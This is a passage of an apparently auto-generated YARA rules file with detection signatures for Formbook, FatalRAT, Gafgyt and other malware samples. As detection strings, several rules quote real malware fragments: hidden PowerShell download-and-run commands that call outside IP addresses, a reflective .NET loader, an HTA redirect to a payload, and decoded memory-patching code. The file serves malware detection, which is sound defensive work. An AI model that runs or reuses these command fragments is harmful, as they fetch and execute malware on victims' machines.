      description = "_subset_batch - file f54de135f77d9dd2b7cb96f3279b6eba1f9bf6ef1ac59e7363a0210101a3e613_f54de135.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f54de135f77d9dd2b7cb96f3279b6eba1f9bf6ef1ac59e7363a0210101a3e613"
   strings:
      $s1 = "Change password using the passwd command" fullword ascii /* score: '20.00'*/
      $s2 = "Password: parrot" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x7355 and filesize < 1KB and
      all of them
}

rule f698d3cf080af90deb93e3ed9f4a9af2d8962ec471725903b0872798cba11108_f698d3cf {
   meta:
      description = "_subset_batch - file f698d3cf080af90deb93e3ed9f4a9af2d8962ec471725903b0872798cba11108_f698d3cf.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f698d3cf080af90deb93e3ed9f4a9af2d8962ec471725903b0872798cba11108"
   strings:
      $s1 = "2025-05-20-05751366.exe.bin" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 700KB and
      all of them
}

rule f7cdb60bb9ab59eb2056e012f6ac7349ba587938ec508b591e750c7d303e2f4d_f7cdb60b {
   meta:
      description = "_subset_batch - file f7cdb60bb9ab59eb2056e012f6ac7349ba587938ec508b591e750c7d303e2f4d_f7cdb60b.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f7cdb60bb9ab59eb2056e012f6ac7349ba587938ec508b591e750c7d303e2f4d"
   strings:
      $s1 = "5231879-3198488745822-265114629371551252378415833314.lnk" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3KB and
      all of them
}

rule f934b28bb323edd41edecc32c7f9acc2f24614688758a27f92bd40f63deffc7a_f934b28b {
   meta:
      description = "_subset_batch - file f934b28bb323edd41edecc32c7f9acc2f24614688758a27f92bd40f63deffc7a_f934b28b.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f934b28bb323edd41edecc32c7f9acc2f24614688758a27f92bd40f63deffc7a"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "word/header1.xmlUT" fullword ascii /* score: '9.00'*/
      $s3 = "word/header3.xmlUT" fullword ascii /* score: '9.00'*/
      $s4 = "word/header2.xmlUT" fullword ascii /* score: '9.00'*/
      $s5 = "lmgnobh" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 900KB and
      all of them
}

rule Formbook_signature__4 {
   meta:
      description = "_subset_batch - file Formbook(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3b13f9a72b2714aa34f33113d62e32b564160d7069e4426b95886d79a59bfc9c"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "v{%D%fv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 6000KB and
      all of them
}

rule Ga_gyt_signature__ec0dcd6e {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_ec0dcd6e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ec0dcd6ec7fd6420c651fc2abae4ee2936510c6ab9cda61c16844da3efb2a4d3"
   strings:
      $s1 = "rp/.sys" fullword ascii /* score: '16.00'*/
      $s2 = ".\\- G]ko&Ubutu Chl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Ga_gyt_signature__d8b96cb7 {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_d8b96cb7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d8b96cb745951bcff61f314154c53403982b1bfb3fef35fa7278384ac7131657"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule fa628b8575564dc71587a0734c73801371be3f9a5ba29208635e6e1c32ba99a7_fa628b85 {
   meta:
      description = "_subset_batch - file fa628b8575564dc71587a0734c73801371be3f9a5ba29208635e6e1c32ba99a7_fa628b85.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fa628b8575564dc71587a0734c73801371be3f9a5ba29208635e6e1c32ba99a7"
   strings:
      $s1 = "NVIDIA.pkg" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 6KB and
      all of them
}

rule Formbook_signature__ea20590a {
   meta:
      description = "_subset_batch - file Formbook(signature)_ea20590a.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ea20590a38532ad0c6effd3b93417b95ca08790c92ba14bd87b833fdd67e5c8a"
   strings:
      $s1 = "execute(HjCZu)" fullword wide /* score: '14.00'*/
      $s2 = "'%googledriver%" fullword wide /* score: '11.00'*/
      $s3 = " oPPCk = oPPCk + oPPCk : PHxyNRghjSQLKLeuuWVZZubagBcNDJUIxpPszsVGCnSTQeTNsK : : msgbox(\"" fullword wide /* score: '8.00'*/
      $s4 = "  oPPCk = oPPCk + oPPCk : PHxyNRghjSQLKLeuuWVZZubagBcNDJUIxpPszsVGCnSTQeTNsK : : msgbox(\"" fullword wide /* score: '8.00'*/
      $s5 = "qnOei = VLZPR + qykTF : Zqhjkgjvygmjqdpddwsjtmsbwqqvwdkqvjsmltbrqqnlfslndh : : msgbox(\"yfncbgmsvg\")" fullword wide /* score: '8.00'*/
      $s6 = "xsvcnscfxmksmjwlpdcqqxzvgzhthrwrfkspczhgmqvhmtqstt" fullword wide /* score: '8.00'*/
      $s7 = "xtnwscbkrmyjwyfbmtlkprzqndqpxrxfdqkfvgxmfwmryfdwvm" fullword wide /* score: '8.00'*/
      $s8 = "xhcgjvxydmmqbbcfjknfcdzzmqmwywfvhtqrxmybjqzbxnxhgf" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 300KB and
      all of them
}

rule FatalRAT_signature_ {
   meta:
      description = "_subset_batch - file FatalRAT(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2a331b359f85b9f2834b268d677b9286e9e4d71ff114ba56d3c55728e32096c6"
   strings:
      $s1 = "902726/UnityPlayer.dll" fullword ascii /* score: '20.00'*/
      $s2 = "902726/fZmLhG.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule FatalRAT_signature__a7b44fc9 {
   meta:
      description = "_subset_batch - file FatalRAT(signature)_a7b44fc9.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a7b44fc9f85021736bc5f4fd076763690d334fd8284b9bb0c13efac5ae440235"
   strings:
      $s1 = "RFdHV0dfLEM6XFVzZXJzXEFkbWluaXN0cmF0b3JcQXBwRGF0YVxMb2NhbFxUZW1wXFJhciRFWGEyMDQwLjE0NjM0LnJhcnRlbXBcZGluZ2RpbmcyMDI1X3dpbjMyX3g2" ascii /* base64 encoded string 'DWGWG_,C:\Users\Administrator\AppData\Local\Temp\Rar$EXa2040.14634.rartemp\dingding2025_win32_x6' */ /* score: '21.00'*/
      $s2 = "R8R7RA/msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s3 = "R8R7RA/K4O4N4m.exe" fullword ascii /* score: '16.00'*/
      $s4 = "RFdHV0dfLEM6XFVzZXJzXEFkbWluaXN0cmF0b3JcQXBwRGF0YVxMb2NhbFxUZW1wXFJhciRFWGEyMDQwLjE0NjM0LnJhcnRlbXBcZGluZ2RpbmcyMDI1X3dpbjMyX3g2" ascii /* score: '11.00'*/
      $s5 = "jgzsrhur" fullword ascii /* score: '8.00'*/
      $s6 = "wzhnermzw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      all of them
}

rule fc55229297d190df8296cb5c1cf825f45fe3707c057dd840689f2ec90d98735c_fc552292 {
   meta:
      description = "_subset_batch - file fc55229297d190df8296cb5c1cf825f45fe3707c057dd840689f2ec90d98735c_fc552292.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fc55229297d190df8296cb5c1cf825f45fe3707c057dd840689f2ec90d98735c"
   strings:
      $s1 = "l=http://8.134.74.227/gg4.hta\";</script></head></html>" fullword ascii /* score: '30.00'*/
      $s2 = "<html><head><script type=\"text/javascript\">window.location=\"https://www.calix.ai/web/blockpage/index.html?spid=rFbDqS7QuZ&t=3" ascii /* score: '26.00'*/
      $s3 = "<html><head><script type=\"text/javascript\">window.location=\"https://www.calix.ai/web/blockpage/index.html?spid=rFbDqS7QuZ&t=3" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule fd842c505db96c6967b882917002e649df2d889043686c1e0664ee95839660a7_fd842c50 {
   meta:
      description = "_subset_batch - file fd842c505db96c6967b882917002e649df2d889043686c1e0664ee95839660a7_fd842c50.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd842c505db96c6967b882917002e649df2d889043686c1e0664ee95839660a7"
   strings:
      $x1 = "3QGOtU2YyQTL5Y2Mh1SM0AjZxgTMl9ydhJ3LlR3chB3Lt92YuEGdzFGcn9Gbuc3d39yL6MHc0RHa';$type = $assembly.GetType('ClassLibrary1.Home');$m" ascii /* score: '37.00'*/
      $x2 = ",'CasPol','','https://pastefy.app/q4icoput/raw','C:\\Users\\Public\\Downloads','RvfdKMRSNw','vbs','1','','dpeqgyPkky','0','start" ascii /* score: '32.00'*/
      $x3 = "ethod = $type.GetMethod('VAI');$method.Invoke($null, [object[]]@($olinia,'','C:\\Users\\Public\\Downloads','RvfdKMRSNw','CasPol'" ascii /* score: '31.00'*/
      $s4 = "$wc = New-Object Net.WebClient; $wc.Encoding = [System.Text.Encoding]::UTF8; $null = ($wc.DownloadString('http://172.245.4.220/i" ascii /* score: '24.00'*/
      $s5 = "$wc = New-Object Net.WebClient; $wc.Encoding = [System.Text.Encoding]::UTF8; $null = ($wc.DownloadString('http://172.245.4.220/i" ascii /* score: '21.00'*/
      $s6 = ":FromBase64String($valor));$olinia = '0hHduUjZhZTYhVjNmdDZ30SN" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7724 and filesize < 2KB and
      1 of ($x*) and all of them
}

rule fe06905f78cd76a3735654f08b313d7ad07c5cbf7e73d91a1200f10db299a849_fe06905f {
   meta:
      description = "_subset_batch - file fe06905f78cd76a3735654f08b313d7ad07c5cbf7e73d91a1200f10db299a849_fe06905f.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fe06905f78cd76a3735654f08b313d7ad07c5cbf7e73d91a1200f10db299a849"
   strings:
      $x1 = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://144.31.2" ascii /* score: '63.00'*/
      $x2 = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://144.31.2" ascii /* score: '59.00'*/
      $s3 = "1.122:8888/lol111' -OutFile ([IO.Path]::Combine([Environment]::GetFolderPath('ApplicationData'), 'script.ps1')); & ([IO.Path]::C" ascii /* score: '22.00'*/
      $s4 = "ombine([Environment]::GetFolderPath('ApplicationData'), 'script.ps1')); Remove-Item ([IO.Path]::Combine([Environment]::GetFolder" ascii /* score: '18.00'*/
      $s5 = "Path('ApplicationData'), 'script.ps1'));\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 1KB and
      1 of ($x*) and all of them
}

rule fe3b52ffa96a6c7474982f6a49c1ceea67f55b1dc7881e77394966d5ca03173c_fe3b52ff {
   meta:
      description = "_subset_batch - file fe3b52ffa96a6c7474982f6a49c1ceea67f55b1dc7881e77394966d5ca03173c_fe3b52ff.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fe3b52ffa96a6c7474982f6a49c1ceea67f55b1dc7881e77394966d5ca03173c"
   strings:
      $s1 = "pe.txt" fullword ascii /* score: '8.00'*/
      $s2 = "1_4.txt" fullword ascii /* score: '8.00'*/
      $s3 = "pe_3.txt" fullword ascii /* score: '8.00'*/
      $s4 = "b.bat%" fullword ascii /* score: '8.00'*/
      $s5 = "1_1.txt" fullword ascii /* score: '8.00'*/
      $s6 = "pe_1.txt" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 400KB and
      all of them
}

rule Formbook_signature__5 {
   meta:
      description = "_subset_batch - file Formbook(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "86f830db01d7cec2671cbf902e9515f8cdd41955cfedd352d8daf96ad085dcdf"
   strings:
      $s1 = "NEW MBL  draft.PDF.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__c15f8f79 {
   meta:
      description = "_subset_batch - file Formbook(signature)_c15f8f79.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c15f8f79bf8029e04f8edede3ebfe1b24d36e8bacf9092663446af5822129838"
   strings:
      $s1 = "PAYMENT CONFIRMATION.pdf.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__f2da7ad1 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f2da7ad1.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f2da7ad11806ef555cb7fed4afb4b89e6803239cbfe43f35e99d90fc4ef0597a"
   strings:
      $s1 = "NEW MBLdraft.pdf.exe" fullword ascii /* score: '19.00'*/
      $s2 = "kgbpmqmer" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__706702f4 {
   meta:
      description = "_subset_batch - file Formbook(signature)_706702f4.z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "706702f4ad4945c69afcde1c015f43c30ae0b2c2b6801c956b275a3ba5d62a49"
   strings:
      $s1 = "Quotation.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__92ecec36 {
   meta:
      description = "_subset_batch - file Formbook(signature)_92ecec36.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "92ecec360230a82fe350115ac26ee8eb7d206c27d72d15ce6b91dab1b5b71d49"
   strings:
      $s1 = "PAYMENT.exe" fullword ascii /* score: '22.00'*/
      $s2 = "!@@/3?D35?" fullword ascii /* score: '9.00'*/ /* hex encoded string '=5' */
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule Formbook_signature__9b256587 {
   meta:
      description = "_subset_batch - file Formbook(signature)_9b256587.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9b256587e39e9b063efd2d9627fa6fb25e0dd657c5282c06e34a6e41b748fbe7"
   strings:
      $s1 = "Belgeler.exe" fullword ascii /* score: '22.00'*/
      $s2 = "!@@/3?D35?" fullword ascii /* score: '9.00'*/ /* hex encoded string '=5' */
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule Formbook_signature__6 {
   meta:
      description = "_subset_batch - file Formbook(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7fb1c02af5bc121c0283157a5a4583eaaf84bca2f603613c57a1a645d442ffeb"
   strings:
      $x1 = "::xEqmfmTrAcZR0fy4+g53sgX357kt7ECp92WSRxm4EDcqIbSTDiRh8WcUA9kKTcai6jP3Chkacg50OopsBlyBt0G9sHHqzWTVcho0ngugUGPYUmfq/9LPOjnrDBldyE" ascii /* score: '64.00'*/
      $s2 = "%ZBDMJDU%s%ZBDMJDU%%ZBDMJDU%e%ZBDMJDU%%ZBDMJDU%t%ZBDMJDU% \"CWPHBA=;$BTCROMKG = [ConKAZWLCGsole]::Title;$VMCPKAZWLCGEUDA = Get-C" ascii /* score: '25.00'*/
      $s3 = "YW5hZ2VyOjpXcml0ZUJ5dGUoW0ludFB0cl06OkFkZCgkV2F2ZVRhcmdldEFkZHJlc3MsICRkZWVwSSksICRkZWVwTW9kaWZpY2F0aW9uRGF0YVskZGVlcEldKSB8IE91" ascii /* base64 encoded string 'anager::WriteByte([IntPtr]::Add($WaveTargetAddress, $deepI), $deepModificationData[$deepI]) | Ou' */ /* score: '24.00'*/
      $s4 = "vSjRHIcpBUeaen9BDIwnfo0F1l9+ORIIJhRXuKnMmRVPbUfTPE+DeBSX+9Rd/8bwHYFHne+JTVqWjQTB56eeDffyKgU3xMpjjNe4xqAIK2WJNOCo9eXEcqRVVlyNBxiD" ascii /* score: '24.00'*/
      $s5 = "iRunABtCwmS16sj+qyrw7XSlTohTDXkn8wTVfEjQTg7bFDhwVowAo7BvF71ddaC9P66m1idvHplTu7n8/t3sq65dt7tSPYzr0yRJwT5v+908fZuIYHCqBBQ8104Da7rs" ascii /* score: '23.00'*/
      $s6 = "dmVQcm9jZWR1cmVEZWxlZ2F0ZSA9IEJ1aWxkLU9jZWFuRGVsZWdhdGUgJG9jZWFuUHJvY2VkdXJlQWRkcmVzcyBAKFtzdHJpbmddLFtVSW50NjRdLk1ha2VCeVJlZlR5" ascii /* base64 encoded string 'veProcedureDelegate = Build-OceanDelegate $oceanProcedureAddress @([string],[UInt64].MakeByRefTy' */ /* score: '21.00'*/
      $s7 = "ZXQtRXhlY3V0aW9uUG9saWN5IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1TY29wZSBDdXJyZW50VXNlciAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu" ascii /* base64 encoded string 'et-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction SilentlyContin' */ /* score: '21.00'*/
      $s8 = "DEYEujpgObjVLf8k36wVEQmfHYi/YqafGyAAcJcpthmWF5N3RgeTxbI5CUW/hjzTMvdZpXWXi8ZP00b+f7DTSc7hsP3kGlrR7fjzibhc4oafHBD4+AC8hyR3lGeOnpPn" ascii /* score: '21.00'*/
      $s9 = "d2F2ZVByb3RlY3Rpb25EZWxlZ2F0ZSA9IEJ1aWxkLU9jZWFuRGVsZWdhdGUgJG9jZWFuUHJvdGVjdGlvbkFkZHJlc3MgQChbSW50UHRyXSxbVUludDMyXSxbVUludDMy" ascii /* base64 encoded string 'waveProtectionDelegate = Build-OceanDelegate $oceanProtectionAddress @([IntPtr],[UInt32],[UInt32' */ /* score: '21.00'*/
      $s10 = "dXJlRGVsZWdhdGUgPSBCdWlsZC1PY2VhbkRlbGVnYXRlICRvY2VhblByb2NlZHVyZUFkZHJlc3MgQChbc3RyaW5nXSxbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChb" ascii /* base64 encoded string 'ureDelegate = Build-OceanDelegate $oceanProcedureAddress @([string],[UInt32].MakeByRefType()) ([' */ /* score: '21.00'*/
      $s11 = "b3J5TWFuYWdlcjo6V3JpdGVCeXRlKFtJbnRQdHJdOjpBZGQoJGRlZXBUcmFjaW5nQWRkcmVzcywgJGRlZXBJKSwgJGRlZXBQYXRjaEJ5dGVzWyRkZWVwSV0pIHwgT3V0" ascii /* base64 encoded string 'oryManager::WriteByte([IntPtr]::Add($deepTracingAddress, $deepI), $deepPatchBytes[$deepI]) | Out' */ /* score: '21.00'*/
      $s12 = "qwLshostYEcvEFadP7EtLQbGqDXG30DtfsMgI1qK9cqovD7vb17U7S6irCD2CLNGrTrkT7Uaix9hRUyRbV5g3EhgPaxmmvil8cqAf2d8/L7+nBzI4llcRapL09VQBs6W" ascii /* score: '21.00'*/
      $s13 = "ANztN4f6neRxmwKeyfmJJUGo/UTIvYkTfbW6TyCCTYu0I3f5xhhyNJtji41+ShWhyEyE0zvxeK5jdp8H2ru6otNGUXhGDOnGjYdzPq0TRH8i9qXbaLaBk0h4OdefUokh" ascii /* score: '19.00'*/
      $s14 = "UnXYCDUKY9WnAAXtmPqHS79UarxDPVpV4ndmLifpIVXYkL/6yW94HijrNz94JGTM9ocIyZ/bg4S1fSCWLBQlwDO20DaSHELLB4qDpjb7X1BgmZz0tFPvlU8S+fZOb3d1" ascii /* score: '19.00'*/
      $s15 = "3hZ/hvCDZfoU7wcI0Kki+Uq+ahBHRsBwvKoJ1SEJPjtMpMXjDeCdS5Lxq5dS6jehwMPHbIEZJiSdimfTpLd4DiyetGpnn96YEGXrks5Dy7ahiRsrPpxrLFi0GfuaXWcH" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a25 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule Formbook_signature__7 {
   meta:
      description = "_subset_batch - file Formbook(signature).rtf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "866a9be2f90b18f54c623063b0c533804aa0eb1217e334b2cb033348422ecdf5"
   strings:
      $s1 = "656e74323d22616363656e74322220616363656e74333d22616363656e74332220616363656e74343d22616363656e74342220616363656e74353d2261636365" ascii /* score: '24.00'*/ /* hex encoded string 'ent2="accent2" accent3="accent3" accent4="accent4" accent5="acce' */
      $s2 = "656e74323d22616363656e74322220616363656e74333d22616363656e74332220616363656e74343d22616363656e74342220616363656e74353d2261636365" ascii /* score: '24.00'*/ /* hex encoded string 'ent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>' */
      $s3 = "0020002100220023002400250026002700280029002a002b002c002d002e002f0030003100320033003400350036003700380039003a003b003c0044" ascii /* score: '24.00'*/ /* hex encoded string ' !"#$%&'()*+,-./0123456789:;<D' */
      $s4 = "4431444465636f6d707265737353686164657273" ascii /* score: '19.00'*/ /* hex encoded string 'D1DDecompressShaders' */
      $s5 = "042)\":\"\":2023-11-07T16:33:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanErr" ascii /* score: '19.00'*/
      $s6 = "\"\":2023-11-07T16:33:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanError]\"20" ascii /* score: '19.00'*/
      $s7 = "07T16:33:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanError]\"2024-03-01T06:5" ascii /* score: '19.00'*/
      $s8 = "9042)\":\"\":2023-11-07T16:33:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanEr" ascii /* score: '19.00'*/
      $s9 = "443144446973617373656d626c65526567696f6e" ascii /* score: '19.00'*/ /* hex encoded string 'D1DDisassembleRegion' */
      $s10 = "1-07T16:33:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanError]\"2024-03-01T06" ascii /* score: '19.00'*/
      $s11 = "2)\":\"\":2023-11-07T16:33:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanError" ascii /* score: '19.00'*/
      $s12 = "23-11-07T16:33:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanError]\"2024-03-0" ascii /* score: '19.00'*/
      $s13 = "3:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanError]\"2024-03-01T06:58:09.:." ascii /* score: '19.00'*/
      $s14 = ")\":\"\":2023-11-07T16:33:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanError]" ascii /* score: '19.00'*/
      $s15 = "3-11-07T16:33:30.002ZOnDemandScanskippedorpartialscanfor[pid:6728,ProcessStart:133438477541179270].Reason[ScanError]\"2024-03-01" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5c7b and filesize < 11000KB and
      8 of them
}

rule Formbook_signature__8 {
   meta:
      description = "_subset_batch - file Formbook(signature).tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "830a00982e0ac172e30db14e1c603fa39e1ff76ef64f61ee7b1eb2bcc8ecbfb5"
   strings:
      $s1 = "$Inquiry For An Urgent Supply.pdf.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__9 {
   meta:
      description = "_subset_batch - file Formbook(signature).vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "14deef118a4819ed0686e57463bf814aa128c5a1f757eeae2d1ca5fa3e376322"
   strings:
      $s1 = "c1qA%XZ+)FFf$/ZZF//8,XGz)A,)Z!zs F!ZTbW /sz%T0+*fw$b~svG)qAG!O qc+TlF9!y)cZ2)$z!s${W**GlX~b)WF8%c;ARq%W2/2W&XoG%Zy0!F2f2+)ZwcGZT" wide /* score: '18.50'*/
      $s2 = "l /fA0blAf982,o)2%),OT8 oW*Rfs~Gl3Z+%{c2,3Tl%GA3 z2fOTTfRZ8Z/%30GFo%Ro%Rb1f8Gf3*;,0*F1z&/G*G!&+ G) OFf&ysffwfvW" fullword wide /* score: '16.00'*/
      $s3 = "*z!/sZoAvqZ*l,vy&lXfz&X,G!f02FsW*bzb,O9TZR2wF3Z9+ZG/FR**O*){~vAf0F%$2Zo+*9zvW AG%loF2 $Fzv+9+Av8TAGf!Z)/AlA; /Z$Tw*/*G/f~bf0+223" wide /* score: '16.00'*/
      $s4 = "As$bFXc+!{1W F{)GG/cR)A!*;AwZA+AGT zA**A%+qz  G{b~* R9/%GFR,*sT/AAq2+XbZ!X1ys 1*+ /s2{yATOvG*fZ&yf%2f{ lc$qGbZ+ff2!&G)XbzGF%o,{9" wide /* score: '14.50'*/
      $s5 = "%ls3$+,!o$G2X&G$2%TwG2!FR!~+2;b+ 2F$$+% ~1ZwFfR9+2+*8!3ZqXG%3*83fFG)+G,c3);F1 ;qGcoF2~bFW&l),zf9vAb/Tzcb;X2F*%z+)%;sO,0v90Z2oGA*" wide /* score: '13.50'*/
      $s6 = "b$+R%0fzX2WZ0+wFb){F&Ts81;*92!F%b+ 8)cl!)cls1o+%s;fvyc&w/*sAFA!1bq1lFfbG{c2&9$yG!X*;&" fullword wide /* score: '13.50'*/
      $s7 = "bloGGoGG~%%A Gqsw!3vGb{+2Aswq&lA z1+ G,O,3f3TzA)%2q*z q9Zf*3*+G" fullword wide /* score: '13.00'*/
      $s8 = "w!2/+AA+FF3O*)2!+bs8F2$!+ TG+G/TWF%R{ZOvAW1ofOcRAT!X9Fsqcl3&;fq" fullword wide /* score: '13.00'*/
      $s9 = "2fZZ0bw2*203A+%8 {ZT*Gs{*O+fRcffl%f0TWc{*2{82)2G+ ,l%O0,;%o!2f)oF2vloG+ZGF3oAzsWG9A0$O!TA;9 Z2" fullword wide /* score: '13.00'*/
      $s10 = ",yXFc0yZOvfw%8fv+ o%Z%TTyscOovZs2F93ZG,G2" fullword wide /* score: '12.00'*/
      $s11 = "w*1AA3*;s0*~c *$w + 298v0WsAAvw&~)AA*T,82))O*FyTGz%,W0fb8s;2T2/{z /Z2" fullword wide /* score: '12.00'*/
      $s12 = "9ZO 8b* /fyc9AGovzZ)*G%f*3+ 9cF/~s*8FwGs+AA{%l&X2FZ0+l&sWX%FGvAoq*A zc12ff+GTb;0A8*)0Ocv3qwGqsWqw 0+fl&ZFA;o,F&* 8c{{z!,O$Z8cZGX" wide /* score: '12.00'*/
      $s13 = "f;)%GAXoR%%9+O,{&2+AG0w,WssO Aqc;%* WZ/XzsvGobyAfR${28,z,q!o0Af0F8qv;&{qZ,%X1+&q*A32fXA%~&FyF8{%; +f~%q" fullword wide /* score: '12.00'*/
      $s14 = "/2ssZ$f82 R1qs+Gl,/Z)T+ /FO0slA9oZv,o)wbX 21yG3+sWvcl&O$F;Gq,2A" fullword wide /* score: '12.00'*/
      $s15 = ";G*f1Z!*%lT~A1w%8 v8,2o*WA* G*99O GAoAwGfG0+&~!+*$v*)AAT2F3*w *92 v$oZ%{ ;oz,08*WA,ZFZ)!;%X2G /XAfvzocwZf~q9Z8&w2+2/)Fvo2z9ARF" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 5000KB and
      8 of them
}

rule Formbook_signature__10 {
   meta:
      description = "_subset_batch - file Formbook(signature).z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4e6767f01235640a310019d997b62bd8a4c492603d525b31dd833339c2788b3f"
   strings:
      $s1 = "Quotation.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__7fc33b64 {
   meta:
      description = "_subset_batch - file Formbook(signature)_7fc33b64.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7fc33b64a8c21d6b340780f58f692e7801ae241ec34db880fe1f518404e3b0ca"
   strings:
      $s1 = "SW_6380312.exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule Formbook_signature__0f95fa77 {
   meta:
      description = "_subset_batch - file Formbook(signature)_0f95fa77.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
